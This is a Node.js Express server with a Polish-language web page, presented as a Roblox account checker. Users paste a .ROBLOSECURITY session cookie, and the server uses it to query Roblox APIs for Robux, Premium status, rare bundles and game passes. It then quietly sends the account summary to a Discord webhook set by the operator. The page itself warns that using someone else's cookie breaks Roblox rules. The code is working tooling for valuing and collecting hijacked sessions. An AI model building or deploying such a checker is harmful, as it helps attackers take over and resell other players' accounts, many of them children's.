const express = require('express');
const app = express();
app.use(express.json());

// CORS – żeby strona działała z dowolnego źródła
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

// Strona główna
app.get('/', (req, res) => {
  res.send(`<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Roblox Account Checker – .ROBLOSECURITY</title>
  <style>
    body { font-family: Arial, sans-serif; max-width: 600px; margin: 40px auto; padding: 20px; background: #111; color: #eee; }
    textarea { width: 100%; height: 140px; background: #222; color: #eee; border: 1px solid #444; padding: 12px; font-family: monospace; resize: vertical; }
    button { padding: 14px 32px; background: #1e90ff; border: none; color: white; font-size: 17px; cursor: pointer; margin: 15px 0; border-radius: 4px; }
    button:hover { background: #0c7ae6; }
    #result { margin-top: 25px; padding: 20px; background: #1a1a1a; border: 1px solid #444; border-radius: 8px; min-height: 300px; line-height: 1.6; }
    .error { color: #ff4d4d; } .success { color: #00ff9d; } b { color: #ddd; } small { color: #aaa; }
    #avatar { max-width: 100%; height: auto; border-radius: 12px; margin: 15px 0; border: 2px solid #444; display: block; }
  </style>
</head>
<body>
<h2>Roblox Account Info (.ROBLOSECURITY)</h2>
<p style="color:#ffcc00; font-weight:bold;">
  <strong>UWAGA:</strong> Używanie cudzego cookie jest niezgodne z regulaminem Roblox i może skończyć się permanentnym banem konta.
</p>
<textarea id="cookie" placeholder="Wklej wartość .ROBLOSECURITY (bez '.ROBLOSECURITY=')"></textarea>
<br>
<button onclick="checkAccount()">Sprawdź konto</button>
<div id="result"></div>

<script>
async function checkAccount() {
  const cookieVal = document.getElementById('cookie').value.trim();
  const result = document.getElementById('result');
  result.innerHTML = '';
  
  if (cookieVal.length < 200) {
    result.innerHTML = '<span class="error">Cookie jest za krótki lub nieprawidłowy</span>';
    return;
  }

  result.innerHTML = '<i>Sprawdzam konto... proszę czekać</i>';

  try {
    const resp = await fetch('/check', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookie: cookieVal })
    });

    const json = await resp.json();

    if (json.error) {
      result.innerHTML = \`<span class="error">Błąd: \${json.error}</span>\`;
      return;
    }

    if (json.success) {
      const creationDate = json.created !== 'failed'
        ? new Date(json.created).toLocaleDateString('pl-PL', { month: 'long', day: 'numeric', year: 'numeric' })
        : '—';

      let avatarHtml = json.avatarUrl
        ? \`<img id="avatar" src="\${json.avatarUrl}" alt="Avatar" onerror="this.src='https://via.placeholder.com/720?text=Brak+Avatara';">\`
        : '<p style="color:#ffcc00;">Nie udało się załadować avatara</p>';

      const mm2Passes = [429957, 1308795];
      let mm2Count = mm2Passes.filter(id => json.hasGamePasses?.includes(id)).length;
      const mm2Color = mm2Count > 0 ? '#00ff9d' : '#ff4d4d';

      const ampPasses = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
      let ampCount = ampPasses.filter(id => json.hasGamePasses?.includes(id)).length;
      const ampColor = ampCount > 0 ? '#00ff9d' : '#ff4d4d';

      const sabPasses = [1227013099, 1229510262, 1228591447];
      let sabCount = sabPasses.filter(id => json.hasGamePasses?.includes(id)).length;
      const sabColor = sabCount > 0 ? '#00ff9d' : '#ff4d4d';

      result.innerHTML = \`
        <span class="success">Konto zweryfikowane pomyślnie!</span><br><br>
        \${avatarHtml}
        <b>Nick:</b> \${json.username}<br>
        <b>Display Name:</b> \${json.displayName}<br>
        <b>User ID:</b> \${json.userId}<br>
        <b>Roblox Premium:</b> <span style="color: \${json.hasPremium ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">\${json.hasPremium ? 'TAK ✓' : 'NIE ✗'}</span><br>
        <b>Email / Telefon zweryfikowany:</b> <span style="color: \${json.emailVerified ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">\${json.emailVerified ? 'TAK ✓' : 'NIE ✗'}</span><br>
        <b>Robux:</b> <span style="color: #ffcc00; font-weight: bold;">\${json.robux.toLocaleString('pl-PL')} Robux</span><br>

        <b>MM2 Gamepasy:</b> <span style="color: \${mm2Color}; font-weight: bold;">\${mm2Count}</span><br>
        <b>AMP Gamepasy:</b> <span style="color: \${ampColor}; font-weight: bold;">\${ampCount}</span><br>
        <b>SAB Gamepasy:</b> <span style="color: \${sabColor}; font-weight: bold;">\${sabCount}</span><br>

        <b>Headless Horseman:</b> <span style="color: \${json.hasHeadless ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">\${json.hasHeadless ? 'TAK ✓' : 'NIE ✗'}</span><br>
        <b>Korblox Deathspeaker:</b> <span style="color: \${json.hasKorblox ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">\${json.hasKorblox ? 'TAK ✓' : 'NIE ✗'}</span><br>

        <b>Wiek konta:</b> <span style="color: #ffcc00; font-weight: bold;">\${json.accountAgeDays} dni</span><br>
        <b>Utworzone:</b> \${creationDate} \${json.created !== 'failed' ? \`<small>(\${json.created.split('T')[0]})\</small>\` : ''}<br>
      \`;
    }
  } catch (e) {
    result.innerHTML = \`<span class="error">Błąd połączenia: \${e.message}</span>\`;
  }
}
</script>
</body>
</html>`);
});

// Endpoint sprawdzający konto + wysyłka na webhook
app.post('/check', async (req, res) => {
  const { cookie } = req.body || {};
  if (!cookie || typeof cookie !== 'string' || cookie.length < 200) {
    return res.status(400).json({ error: 'Brak lub nieprawidłowy cookie' });
  }

  try {
    // CSRF Token
    const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
      method: 'POST',
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'Content-Type': 'application/json'
      },
    });
    const csrfToken = tokenRes.headers.get('x-csrf-token');
    if (!csrfToken) throw new Error('Nie udało się pobrać X-CSRF-Token – nieważny/expired cookie?');

    // Dane użytkownika
    const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
      method: 'GET',
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'X-CSRF-TOKEN': csrfToken,
        'Accept': 'application/json',
      },
    });
    if (!userRes.ok) {
      throw new Error(userRes.status === 401 ? 'Nieprawidłowy lub wygasły cookie' : `Błąd API: ${userRes.status}`);
    }
    const userData = await userRes.json();

    // Email/Telefon zweryfikowany (hat verified)
    let emailVerified = false;
    try {
      const ownsRes = await fetch(
        `https://inventory.roblox.com/v1/users/${userData.id}/items/Asset/102611803`,
        {
          headers: {
            'Cookie': `.ROBLOSECURITY=${cookie}`,
            'X-CSRF-TOKEN': csrfToken,
            'Accept': 'application/json',
          },
        }
      );
      if (ownsRes.ok) {
        const ownsData = await ownsRes.json();
        emailVerified = Array.isArray(ownsData.data) && ownsData.data.length > 0;
      }
    } catch {}

    // Premium
    let hasPremium = false;
    try {
      const premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (premiumRes.ok) hasPremium = await premiumRes.json();
    } catch {}

    // Robux
    let robux = 0;
    try {
      const currencyRes = await fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (currencyRes.ok) {
        const data = await currencyRes.json();
        robux = data.robux || 0;
      }
    } catch {}

    // Wiek konta + data utworzenia
    let accountAgeDays = 0;
    let createdDate = null;
    try {
      const profileRes = await fetch(`https://users.roblox.com/v1/users/${userData.id}`);
      if (profileRes.ok) {
        const profile = await profileRes.json();
        if (profile.created) {
          createdDate = profile.created;
          accountAgeDays = Math.floor((Date.now() - new Date(createdDate).getTime()) / 86400000);
        }
      }
    } catch {}

    // Avatar
    let avatarUrl = null;
    try {
      const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userData.id}&size=720x720&format=Png&isCircular=false`);
      if (thumbRes.ok) {
        const thumbData = await thumbRes.json();
        avatarUrl = thumbData.data?.[0]?.imageUrl || null;
      }
    } catch {}

    // Gamepasy
    const mm2Ids = [429957, 1308795];
    const ampIds = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
    const sabIds = [1227013099, 1229510262, 1228591447];
    const allIds = [...mm2Ids, ...ampIds, ...sabIds];
    const hasGamePasses = [];

    try {
      for (const passId of allIds) {
        const gpRes = await fetch(
          `https://inventory.roblox.com/v1/users/${userData.id}/items/GamePass/${passId}`,
          {
            headers: {
              'Cookie': `.ROBLOSECURITY=${cookie}`,
              'X-CSRF-TOKEN': csrfToken,
              'Accept': 'application/json',
            },
          }
        );
        if (gpRes.ok) {
          const gpData = await gpRes.json();
          if (Array.isArray(gpData.data) && gpData.data.length > 0) {
            hasGamePasses.push(passId);
          }
        }
      }
    } catch {}

    // Headless i Korblox – sprawdzamy jako Bundle (według podanych przez Ciebie ID)
    let hasHeadless = false;
    let hasKorblox = false;

    try {
      // Headless Horseman – bundle 201
      const headlessRes = await fetch(
        `https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle/201`,
        {
          headers: {
            'Cookie': `.ROBLOSECURITY=${cookie}`,
            'X-CSRF-TOKEN': csrfToken,
            'Accept': 'application/json',
          },
        }
      );
      if (headlessRes.ok) {
        const data = await headlessRes.json();
        hasHeadless = Array.isArray(data.data) && data.data.length > 0;
      }

      // Korblox Deathspeaker – bundle 192
      const korbloxRes = await fetch(
        `https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle/192`,
        {
          headers: {
            'Cookie': `.ROBLOSECURITY=${cookie}`,
            'X-CSRF-TOKEN': csrfToken,
            'Accept': 'application/json',
          },
        }
      );
      if (korbloxRes.ok) {
        const data = await korbloxRes.json();
        hasKorblox = Array.isArray(data.data) && data.data.length > 0;
      }
    } catch (e) {
      console.error('Błąd sprawdzania bundle Headless/Korblox:', e.message);
    }

    const result = {
      success: true,
      username: userData.name,
      displayName: userData.displayName || userData.name,
      userId: userData.id,
      hasPremium,
      robux,
      accountAgeDays,
      created: createdDate || 'failed',
      avatarUrl,
      hasGamePasses,
      emailVerified,
      hasHeadless,
      hasKorblox,
    };

    res.status(200).json(result);

    // Wysyłka do webhooka Discord
    const webhookUrl = process.env.WEBHOOK;
    if (webhookUrl) {
      try {
        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            embeds: [{
              title: `${userData.name} ・ Roblox Info`,
              color: 0x9B59B6,
              thumbnail: {
                url: avatarUrl || "https://tr.rbxcdn.com/30DAY-AvatarHeadshot?width=720&height=720&format=png"
              },
              fields: [
                { name: "Nick", value: userData.name, inline: true },
                { name: "Premium", value: hasPremium ? "Tak" : "Nie", inline: true },
                { name: "Email/Telefon", value: emailVerified ? "Tak" : "Nie", inline: true },
                {
                  name: "\u200B",
                  value: `<:robux:1481759314426204230> ${robux.toLocaleString('en-US')}`,
                  inline: true
                },
                { name: "Utworzone", value: createdDate ? createdDate.split('T')[0] : "?", inline: true },
                { name: "Wiek konta", value: `${accountAgeDays} dni`, inline: true },
                { name: "<:MM2:1481763122808230164> Gamepasy", value: hasGamePasses.filter(id => mm2Ids.includes(id)).length.toString(), inline: true },
                { name: "<:AMP:1481763635775930520> Gamepasy", value: hasGamePasses.filter(id => ampIds.includes(id)).length.toString(), inline: true },
                { name: "<:SAB:1481763931113394177> Gamepasy", value: hasGamePasses.filter(id => sabIds.includes(id)).length.toString(), inline: true },
                { name: "Headless Horseman", value: hasHeadless ? "Tak ✓" : "Nie ✗", inline: true },
                { name: "Korblox Deathspeaker", value: hasKorblox ? "Tak ✓" : "Nie ✗", inline: true },
              ],
              footer: {
                text: "Checker • " + new Date().toLocaleString('pl-PL')
              },
              timestamp: new Date().toISOString()
            }]
          })
        });
      } catch (e) {
        console.error("Błąd wysyłania do webhooka:", e.message);
      }
    }

  } catch (err) {
    console.error(err);
    res.status(500).json({ error: err.message || 'Błąd wewnętrzny serwera' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Serwer uruchomiony na porcie ${PORT}`);
});
